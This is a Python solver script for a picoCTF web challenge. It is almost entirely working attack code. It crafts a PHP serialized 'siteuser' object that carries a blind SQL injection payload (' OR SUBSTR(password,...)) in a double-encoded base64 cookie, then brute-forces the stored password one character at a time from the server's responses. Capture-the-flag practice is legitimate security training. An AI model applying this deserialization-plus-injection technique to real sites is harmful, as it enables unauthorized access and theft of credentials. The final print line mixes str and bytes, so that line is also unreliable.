#!/usr/bin/python3

import base64
import urllib.parse
import requests
import string

url = "https://2019shell1.picoctf.com/problem/62195/index.php?file=admin"
c_array = """abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}0123456789!$-.<=>?@_"""
correct_s = 'Welcome'

def make_phpobj(name, m):
	s = b'O:'
	s += str(len(name)).encode() + b':"' + name + b'":'
	s += str(len(m)).encode() + b':'
	s += b'{'
	for i in range(len(m)):
		s += b's:'
		s += str(len(m[i][0])).encode() + b':"'
		s += m[i][0] + b'";'
		s += b's:'
		s += str(len(m[i][1])).encode() + b':"'
		s += m[i][1] + b'";'
	s += b'}'
	print(s)
	return s

if __name__ == '__main__':
	flag = b''
	m = [[b'username', b'admin'], [b'password', b'']]
	while b'}' not in flag:
		for c in c_array:
			try_s = flag + c.encode()
			# make request parameter
			# param = 
			m[1][1] = b"' OR SUBSTR(password,1,"
			m[1][1] += str(len(try_s)).encode() + b")='"+try_s
			# mycookie
			session = urllib.parse.quote(urllib.parse.quote(base64.b64encode(make_phpobj(b"siteuser", m))))
			my_cookie = {"user_info": session}
			# GET, setcookie
			res = requests.get(url, cookies=my_cookie)
			if res.status_code != 500:
				if correct_s in res.text:
					flag += c.encode()
					print(flag)
					break
	print("flag" + flag)	
	
